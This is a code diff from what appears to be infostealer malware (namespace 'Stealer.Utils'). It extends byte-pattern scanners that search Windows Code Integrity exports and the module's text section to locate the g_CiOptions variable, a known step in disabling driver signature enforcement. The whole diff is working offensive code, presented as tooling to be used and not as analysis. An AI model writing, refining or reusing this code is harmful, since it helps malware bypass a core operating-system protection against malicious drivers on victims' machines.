@@ -396,26 +396,70 @@ namespace Stealer.Utils
             byte[] code = new byte[maxOffset];
             Marshal.Copy(baseAddr, code, 0, maxOffset);
 
+            // Pattern 1: mov dword ptr [g_CiOptions], 6 -> C7 05 XX XX XX XX 06 00 00 00
+            for (int i = 0; i < maxOffset - 10; i++)
+            {
+                if (code[i] == 0xC7 && code[i + 1] == 0x05 &&
+                    code[i + 6] == 0x06 && code[i + 7] == 0x00 &&
+                    code[i + 8] == 0x00 && code[i + 9] == 0x00)
+                {
+                    int rel = BitConverter.ToInt32(code, i + 2);
+                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 10);
+                    return new IntPtr(nextInstr.ToInt64() + rel);
+                }
+            }
+
+            // Pattern 2: 89 05 / 8B 05 / 89 0D / 8B 0D (Standard MOV relative)
             for (int i = 0; i < maxOffset - 6; i++)
             {
-                if ((code[i] == 0x89 || code[i] == 0x8B) && (code[i + 1] & 0xC7) == 0x05)
+                if ((code[i] == 0x89 || code[i] == 0x8B) && ((code[i + 1] & 0xC7) == 0x05 || (code[i + 1] & 0xC7) == 0x0D))
                 {
                     int rel = BitConverter.ToInt32(code, i + 2);
                     IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 6);
-                    IntPtr target = new IntPtr(nextInstr.ToInt64() + rel);
-                    return target;
+                    return new IntPtr(nextInstr.ToInt64() + rel);
                 }
             }
+
+            // Pattern 3: 44 8B 05 / 48 8B 05 (REX prefix MOV relative)
+            for (int i = 0; i < maxOffset - 7; i++)
+            {
+                if ((code[i] == 0x44 || code[i] == 0x48) && (code[i + 1] == 0x89 || code[i + 1] == 0x8B) && ((code[i + 2] & 0xC7) == 0x05 || (code[i + 2] & 0xC7) == 0x0D))
+                {
+                    int rel = BitConverter.ToInt32(code, i + 3);
+                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 7);
+                    return new IntPtr(nextInstr.ToInt64() + rel);
+                }
+            }
+
             return IntPtr.Zero;
         }
 
         private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase)
         {
-            IntPtr exportAddr = GetProcAddress(userBase, "CiFreePolicyInfo");
-            if (exportAddr != IntPtr.Zero)
+            string[] exports = new string[] {
+                "CiInitialize",
+                "CiFreePolicyInfo",
+                "CiValidateImageHeader",
+                "CipReportSecurityViolation"
+            };
+
+            foreach (string exp in exports)
             {
-                return ScanForGCiOptions(exportAddr, 0x80);
+                IntPtr exportAddr = GetProcAddress(userBase, exp);
+                if (exportAddr != IntPtr.Zero)
+                {
+                    IntPtr target = ScanForGCiOptions(exportAddr, 0x1000);
+                    if (target != IntPtr.Zero) return target;
+                }
             }
+
+            try
+            {
+                IntPtr textSection = new IntPtr(userBase.ToInt64() + 0x1000);
+                return ScanForGCiOptions(textSection, 0x30000);
+            }
+            catch { }
+
             return IntPtr.Zero;
         }
 
